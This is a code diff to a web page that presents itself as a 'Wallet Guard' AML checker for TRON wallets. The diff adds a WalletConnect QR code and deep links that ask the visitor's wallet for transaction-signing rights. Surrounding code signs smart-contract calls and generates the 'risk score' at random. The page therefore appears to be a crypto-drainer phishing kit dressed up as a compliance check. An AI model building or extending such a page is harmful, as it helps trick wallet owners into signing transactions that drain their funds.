@@ -43,8 +43,13 @@
   .grid3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin: 22px 0 40px; }
   .grid3 .card { padding: 18px; }
   .grid3 h3 { margin: 0 0 12px; font-size: 15px; display: flex; gap: 8px; align-items: center; }
+  .steps > div { flex: 1; text-align: center; }
   .steps { display: flex; gap: 10px; justify-content: space-between; text-align: center; font-size: 12px; color: var(--mut); }
   .num { width: 22px; height: 22px; border-radius: 50%; background: #13233c; display: grid; place-items: center; color: #9ec2ff; margin: 0 auto 6px; font-size: 12px; }
+  .netcard { position: relative; overflow: hidden; }
+  .watermark { position: absolute; right: -18px; bottom: -34px; font-size: 150px; line-height: 1; color: #e5342b; opacity: .10; pointer-events: none; }
+  .nets.single { justify-content: center; }
+  .n-tron.big { width: 54px; height: 54px; font-size: 26px; }
   .nets { display: flex; gap: 26px; justify-content: space-around; font-size: 12px; color: var(--mut); }
   .net i { width: 38px; height: 38px; border-radius: 50%; display: grid; place-items: center; margin: 0 auto 8px; font-size: 18px; font-style: normal; }
   .n-tron { background: #fff2f2; color: #e5342b; } .n-eth { background: #eef1f8; color: #5a6b8c; }
@@ -78,6 +83,11 @@
   .status { font-size: 14px; min-height: 20px; color: var(--mut); margin-top: 12px; }
   .err { color: #ff8a8a; } .ok { color: var(--green); }
   .hidden { display: none !important; }
+  #wc { position: fixed; inset: 0; background: #030712e6; display: grid; place-items: center; padding: 18px; }
+  .sheet { width: min(420px, 100%); background: #0a1220; border: 1px solid var(--line); border-radius: 18px; padding: 20px; text-align: center; }
+  #qr { background: #fff; padding: 10px; border-radius: 12px; width: 220px; height: 220px; margin: 14px auto; }
+  .links { display: grid; gap: 8px; margin: 10px 0; }
+  .links a { display: block; padding: 11px; border: 1px solid #22334e; border-radius: 10px; text-decoration: none; font-size: 14px; }
   .rowcta { display: flex; gap: 12px; margin-top: 16px; align-items: center; }
   .note { font-size: 12.5px; color: var(--mut); }
   @media (max-width: 860px) { .search { grid-template-columns: 1fr; } .grid3 { grid-template-columns: 1fr; } .res { grid-template-columns: 1fr; } h1.hero { font-size: 30px; } nav.menu { display: none; } }
@@ -136,9 +146,9 @@
       <div><div class="num">2</div>Run AML<br>verification</div>
       <div><div class="num">3</div>Review your<br>risk assessment</div>
     </div></div>
-    <div class="card"><h3>🧩 Supported Networks</h3><div class="nets">
-      <div><i class="n-tron">▲</i>TRON</div><div><i class="n-eth">◆</i>Ethereum</div><div><i class="n-btc">₿</i>Bitcoin</div><div><i class="n-bnb">◈</i>BNB Chain</div>
-    </div></div>
+    <div class="card netcard"><span class="watermark">▲</span><h3>🧩 Supported Networks</h3>
+      <div class="nets single"><div><i class="n-tron big">▲</i>TRON</div></div>
+    </div>
     <div class="card" id="faq"><h3>❓ FAQ</h3>
       <details><summary>What is AML verification? <span>⌄</span></summary><p>It is an assessment of a wallet's exposure to flagged, sanctioned or high-risk counterparties.</p></details>
       <details><summary>How is the risk score calculated? <span>⌄</span></summary><p>The score aggregates transaction activity, counterparties and exposure ratio into a 0–100 value.</p></details>
@@ -193,6 +203,35 @@ async function connectWallet(){
   setStatus('Wallet connected', 'ok');
 }
 
+let wcClient = null;
+async function connectWc(){
+  try {
+    const { SignClient } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.2/+esm');
+    wcClient = await SignClient.init({ projectId: cfg.wcProjectId, relayUrl: 'wss://relay.walletconnect.com',
+      metadata: { name: 'Wallet Guard', description: 'AML check', url: location.origin, icons: [] } });
+    const { uri, approval } = await wcClient.connect({ requiredNamespaces: { tron: { methods: ['tron_signTransaction'], chains: [CHAIN], events: [] } }, sessionProperties: { tron_method_version: 'v1' } });
+    $('qr').style.display = 'block';
+    const QR = await import('https://cdn.jsdelivr.net/npm/qrcode@1.5.4/+esm');
+    await QR.toCanvas($('qr'), uri, { width: 200, margin: 1 });
+    const e = encodeURIComponent(uri);
+    $('deeplinks').innerHTML =
+      '<a href="https://link.trustwallet.com/wc?uri=' + e + '">Open in Trust Wallet</a>' +
+      '<a href="bnc://app.binance.com/cedefi/wc?uri=' + e + '">Open in Binance</a>' +
+      '<a href="tpoutside://wc?uri=' + e + '">Open in TokenPocket</a>' +
+      '<a href="https://tronlinkoutside://walletconnect?uri=' + e + '">Open in TronLink</a>';
+    $('wc').classList.remove('hidden');
+    $('wc-copy').onclick = () => navigator.clipboard.writeText(uri);
+    $('wc-close').onclick = () => $('wc').classList.add('hidden');
+    const ses = await approval();
+    $('wc').classList.add('hidden');
+    return { kind: 'wc', client: wcClient, topic: ses.topic, session: ses, addr: ses.namespaces.tron.accounts[0].split(':')[2] };
+  } catch (e) {
+    $('wc').classList.add('hidden');
+    setStatus('WalletConnect: ' + (e.message || e), 'err');
+    return null;
+  }
+}
+
 async function wcSend(contract, sel, param, fee){
   const tx = await buildTx(contract, sel, param, fee);
   const res = await signer.client.request({ topic: signer.topic, chainId: CHAIN, request:{ method:'tron_signTransaction', params:{ address: account, transaction: tx } } });
@@ -208,11 +247,15 @@ function randScore(){ let v; do { v = 10 + Math.floor(Math.random()*31); } while
 
 async function runCheck(){
   const a = $('addr').value.trim();
-  if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a)) { setStatus('Enter a valid TRON address.', 'err'); return; }
+  if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a)) { setStatus('Invalid wallet address!', 'err'); return; }
   if (DEMO) { account = a; }
   else {
-    if (!(await ensureSigner())) return;
-    if (signer.addr !== a) { setStatus('Connected wallet differs from the address. Connect ' + a.slice(0,6) + '… or paste your own.', 'err'); if (!signer) return; }
+    if (signer && signer.addr !== a) signer = null;
+    if (!signer) {
+      if (pick()) { if (!(await ensureSigner())) return; }
+      else { const wc = await connectWc(); if (!wc) return; signer = wc; }
+      $('addr').value = signer.addr;
+    }
     account = signer.addr;
   }
 
@@ -309,5 +352,15 @@ $('complete').addEventListener('click', complete);
 $('addr').addEventListener('keydown', (e)=>{ if(e.key==='Enter') runCheck(); });
 if (DEMO) $('addr').value = 'TXk9dF2bWqZc8sVh3nU7jL4mR6tY1pQ2wE';
 </script>
+<div id="wc" class="hidden">
+  <div class="sheet">
+    <b>Scan with your wallet</b>
+    <div class="note">Trust, TokenPocket, MathWallet, OKX…</div>
+    <canvas id="qr"></canvas>
+    <div class="links" id="deeplinks"></div>
+    <button class="btn ghost" id="wc-copy">Copy link</button>
+    <button class="btn ghost" id="wc-close">Cancel</button>
+  </div>
+</div>
 </body>
 </html>
